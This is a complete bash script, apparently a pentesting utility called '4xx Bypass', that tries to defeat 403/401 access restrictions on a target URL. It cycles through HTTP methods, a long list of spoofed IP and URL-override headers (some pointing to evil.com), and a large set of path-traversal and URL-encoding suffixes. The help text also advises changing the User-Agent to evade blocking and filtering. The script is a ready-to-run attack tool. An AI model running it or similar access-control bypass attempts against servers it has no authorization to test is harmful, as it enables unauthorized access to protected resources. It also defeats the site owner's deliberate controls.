#!/bin/bash

# Color variables
RED='\033[0;31m'
GREEN='\033[0;32m'
LTCYAN='\033[1;36m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
RESET='\033[0m'

# Create the result folder if it doesn't exist
if [ ! -d "Results" ]; then
  mkdir Results
else
  # If the directory already exists, remove any existing output files
  rm -f Results/${code}.txt
fi

# print_result function
print_result() {
  local code=$1
  local size=$2
  local url=$3
  local type=$4
  local value=$5

  # Set color based on HTTP status code
  case $code in
    2*) color=$GREEN ;;
    3*) color=$LTCYAN ;;
    4*) color=$YELLOW ;;
    5*) color=$RED ;;
    *) color=$BLUE ;;
  esac

  if [ "$type" = "method" ]; then
    echo -e "  ${BLUE}Status: ${color}$code${RESET}\t${BLUE}Size: ${color}$size${RESET} \t -> ${BLUE}Method: ${color}$value${RESET}.  \t: ${url} "
    echo -e "${value}\t${code}\t${size}\t${url}" >> "Results/${code}.txt"
  elif [ "$type" = "header" ]; then
    echo -e "  ${BLUE}Status: ${color}$code${RESET}\t${BLUE}Size: ${color}$size${RESET} \t -> ${BLUE}Header: ${color}$value${RESET}.  \t: ${url} "
    echo -e "${value}\t${code}\t${size}\t${url}" >> "Results/${code}.txt"
  elif [ "$type" = "suffix" ]; then
    echo -e "  ${BLUE}Status: ${color}$code${RESET}\t${BLUE}Size: ${color}$size${RESET} \t -> ${BLUE}Suffix: ${color}$value${RESET}.  \t: ${url} "
    echo -e "${value}\t${code}\t${size}\t${url}" >> "Results/${code}.txt"
  fi
}

# help function
help() {
  echo -e "${RED}Usage: $0 [options] <url>"
  echo ""
  echo -e "${BLUE}Options:"
  echo "  -h, --help          Show this help message and exit"
  echo "  -u, --user-agent   Specify a custom User-Agent (default: Vigrahak)"
  echo ""
  echo -e "${GREEN}Examples:"
  echo "  $0 http://example.com"
  echo "  $0 -u 'Mozilla/5.0' http://example.com"
  echo ""
  echo -e "Note: ${LTCYAN}In the event that a request returns a status code of 0 and a response size of 0, it is recommended to attempt to modify the User-Agent header in order to circumvent potential blocking or filtering mechanisms. This approach can help to ensure successful request completion and data retrieval. By dynamically adjusting the User-Agent, developers can increase the likelihood of receiving a valid response and minimize the occurrence of empty or failed requests"
  exit 0
}

# Process command-line arguments
while getopts ":hu:" opt; do
  case $opt in
    h) help ;;
    u) user_agent="$OPTARG" ;;
    \?) echo "Invalid option: -$OPTARG"; exit 1 ;;
  esac
done

shift $((OPTIND - 1))

# Main script
if [ $# -eq 0 ]; then
  echo -e "\n$(figlet 4xx Bypass)\n"
  echo -e "                                             ${LTCYAN}- By Vigrahak${RESET}"
  echo -e "${RED}Have a beer : ${LTCYAN}https://www.paypal.com/paypalme/SourrahS1828"
  echo ""
  bar='###########################################################'
  for i in {1..100}; do
    if [[ $i > 0 ]]; then
      color=${RED}
    fi
    if [[ $i > 15 ]]; then
      color=${YELLOW}
    fi
    if [[ $i > 30 ]]; then
      color=${GREEN}
    fi
    if [[ $i > 50 ]]; then
      color=${GREEN}
    fi
    if [[ $i > 75 ]]; then
      color=${GREEN}
    fi
    echo -ne "${color}${bar:0:$i}\r"
    sleep 0.02
  done
  echo ""
  help
fi

# Process URLs 1
        echo -e ${RED}"----------------------"${end}
	echo -e ${LTCYAN}"[+] HTTP Method Bypass"${end}
	echo -e ${RED}"----------------------"${end}
	
url=$1
methods=(GET POST PUT DELETE HEAD OPTIONS PATCH)
for method in "${methods[@]}"; do
  code=$(curl -ksL -o /dev/null -i -w "%{http_code}" -H "User-Agent: ${user_agent:-Vigrahak}" -X "$method" "$url")
  size=$(curl -ksL -o /dev/null -i -w "%{size_download}" -H "User-Agent: ${user_agent:-Vigrahak}" -X "$method" "$url")
  print_result "$code" "$size" "$url" "method" "$method"
done

# Process URLs 2
        echo -e "${RED}----------------------${end}"
        echo -e "${LTCYAN}[+] HTTP Header Bypass${end}"
        echo -e "${RED}----------------------${end}"
        
url=$1
methods=(GET)
  for method in "${methods[@]}"; do
headers=("True-Client-Ip: 127.0.0.1" "X-WAP-Profile: 127.0.0.1" "Profile: http://evil.com" "X-Arbitrary: http://evil.com" "X-HTTP-DestinationURL: http://evil.com" "X-Forwarded-Proto: http://evil.com" "Profile: https://evil.com" "X-Arbitrary: https://evil.com" "X-HTTP-DestinationURL: https://evil.com" "X-Forwarded-Proto: https://evil.com" "Destination: 127.0.0.1" "Referer: ${url}" "CF-Connecting_IP: 127.0.0.1" "X-Custom-Ip-Authorization: 127.0.0.1" "X-Remote-Ip: 127.0.0.1" "X-Client-Ip: 127.0.0.1" "X-Host: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1" "X-Original-Url: ${url}" "X-Rewrite-Url: ${url}" "Content-Length: 0" "X-Proxyuser-Ip: 127.0.0.1" "Base-Url: 127.0.0.1" "Client-Ip: 127.0.0.1" "Http-Url: 127.0.0.1" "Proxy-Host: 127.0.0.1" "Proxy-Url: 127.0.0.1" "Real-Ip: 127.0.0.1" "Redirect: 127.0.0.1" "Request-Uri: 127.0.0.1" "Uri: 127.0.0.1" "Url: 127.0.0.1" "X-Forward-For: 127.0.0.1" "X-Forward-By: 127.0.0.1" "X-Forwarded-For-Original: 127.0.0.1" "X-Forwarded-For-Server: 127.0.0.1" "X-Forwarded: 127.0.0.1" "X-Forwarder-For: 127.0.0.1" "X-Http-Destinationurl: 127.0.0.1" "X-Http-Host-Override: 127.0.0.1" "X-Original-Remote-Addr: 127.0.0.1" "X-Proxy-Url: 127.0.0.1" "X-Real-Ip: 127.0.0.1" "X-Remote-Addr: 127.0.0.1" "X-Oreferrer: https%3A%2F%2Fwww.google.com%2F" "Client-Ip: 127.0.0.1" "X-Custom-Ip-Authorization: 127.0.0.1" "X-True-IP: 127.0.0.1" "X-Originally-Forwarded-For: 127.0.0.1" "X-Originating-Ip: 127.0.0.1" "X-Requested-With: XMLHttpRequest" "X-Forwarded-Scheme: http" "X-Forwarded-Scheme: https" "X-Forwarded-Port: 443" "X-Forwarded-Port: 4443" "X-Forwarded-Port: 80" "X-Forwarded-Port: 8080" "X-Forwarded-Port: 8443")
for header in "${headers[@]}"; do
  code=$(curl -ksL -o /dev/null -i -w "%{http_code}" -H "User-Agent: ${user_agent:-Vigrahak}" -H "$header" -X "$method" "$url")
  size=$(curl -ksL -o /dev/null -i -w "%{size_download}" -H "User-Agent: ${user_agent:-Vigrahak}" -H "$header" -X "$method" "$url")
  print_result "$code" "$size" "$url" "header" "$header"
 done
done

# Process URLs 3
	echo -e ${RED}"----------------------"${end}
	echo -e ${LTCYAN}"[+] URL Encode Bypass "${end}
	echo -e ${RED}"----------------------"${end}
	
url=$1
suffixes=("" "#" "#?" "%" "%09" "%09%3b" "%09.." "%09;" "%0" "%0/" "%3" "%3%3f" "%5f%5f" "%5f/" "%6" "%e" "%e%e" "%e%e%f" "%e%e/" "%f" "%f%0%3" "%f%3" "%f%f" "%f%3b%f" "%f%3b%f%f" "%f%3f" "%f%3f/" "%f/" "%3b" "%3b%09" "%3b%f%e%e" "%3b%f%e%e%f%e%e%f%f" "%3b%f%e." "%3b%f.." "%3b/%e%e/..%f%f" "%3b/%e." "%3b/%f%f../" "%3b/.." "%3b//%f../" "%3f" "%3f%3" "%3f%3f" "&" "*" "." ".%e/" ".." "..%00/" "..%00/;" "..%00;/" "..%09" "..%0d/" "..%0d/;" "..%0d;/" "..%5c" "..%5c/" "..%ff/" "..%ff/;" "..%ff;/" "../" "../%f" ".././" "..;" "..;%00/" "..;%0d/" "..;%ff/" "..;/" "..;\ " "..;\;" "..\ " "..\;" "./." ".//./" ".html" ".json" "/" "/%0#" "/%0%3" "/%5e%5e%5f/" "/%5e%5e%53b/" "/%5e%5f/" "/%5e%53b/" "/%5e/" "/%5f" "/%e%e" "/%e%e%3b/" "/%e%e/" "/%e%f/" "/%e%3b/" "/%e%3b//" "/%e/" "/%e//" "/%f" "/%3b/" "/*" "/*/" "/." "/.." "/..%f" "/..%f..%f" "/..%f..%f..%f" "/../" "/../../" "/../../../" "/../../..//" "/../..//" "/../..//../" "/../..;/" "/.././../" "/../.;/../" "/..//" "/..//../" "/..//../../" "/..//..;/" "/../;/" "/../;/../" "/..;%f" "/..;%f..;%f" "/..;%f..;%f..;%f" "/..;/" "/..;/../" "/..;/..;/" "/..;//" "/..;//../" "/..;//..;/" "/..;/;/" "/..;/;/..;/" "/./" "/.//" "/.;/" "/.;//" "/.randomstring" "//" "//." "//.." "//../../" "//..;" "//./" "//.;/" "///.." "///../" "///..//" "///..;" "///..;/" "///..;//" "////" "//;/" "//?anything" "/;/" "/;//" "/;x" "/;x/" "/x/../" "/x/..//" "/x/../;/" "/x/..;/" "/x/..;//" "/x/..;/;/" "/x//../" "/x//..;/" "/x/;/../" "/x/;/..;/" ";" ";%09" ";%09.." ";%09..;" ";%09;" ";%F.." ";%f%e%e" ";%f%e%e%f%e%e%f%f" ";%f%f/../" ";%f.." ";%f..%f%e%e%f%f" ";%f..%f..%f%f" ";%f..%f/" ";%f..%f/..%f" ";%f..%f/../" ";%f../%f..%f" ";%f../%f../" ";%f..//..%f" ";%f..//../" ";%f..///" ";%f..///;" ";%f..//;/" ";%f..//;/;" ";%f../;//" ";%f../;/;/" ";%f../;/;/;" ";%f..;///" ";%f..;//;/" ";%f..;/;//" ";%f/%f../" ";%f//..%f" ";%f//../" ";%f//..;/" ";%f/;/../" ";%f/;/..;/" ";%f;//../" ";%f;/;/..;/" ";/%e%e" ";/%e%e%f%f" ";/%e%e%f/" ";/%e%e/" ";/%e." ";/%f%f../" ";/%f/..%f" ";/%f/../" ";/.%e" ";/.%e/%e%e/%f" ";/.." ";/..%f" ";/..%f%f../" ";/..%f..%f" ";/..%f/" ";/..%f//" ";/../" ";/../%f/" ";/../../" ";/../..//" ";/.././../" ";/../.;/../" ";/..//" ";/..//%e%e/" ";/..//%f" ";/..//../" ";/..///" ";/../;/" ";/../;/../" ";/..;" ";/.;." ";//%f../" ";//.." ";//../../" ";///.." ";///../" ";///..//" ";x" ";x/" ";x;" "?" "???" "??" "\..\.\ ")
methods=(GET)
for suffix in "${suffixes[@]}"; do
  new_url="${url}${suffix}"
  for method in "${methods[@]}"; do
    code=$(curl -ksL -o /dev/null -i -w "%{http_code}" -H "User-Agent: ${user_agent:-Vigrahak}" -X "$method" "$new_url")
    size=$(curl -ksL -o /dev/null -i -w "%{size_download}" -H "User-Agent: ${user_agent:-Vigrahak}" -X "$method" "$new_url")
    print_result "$code" "$size" "$new_url" "suffix" "$suffix"
  done
done
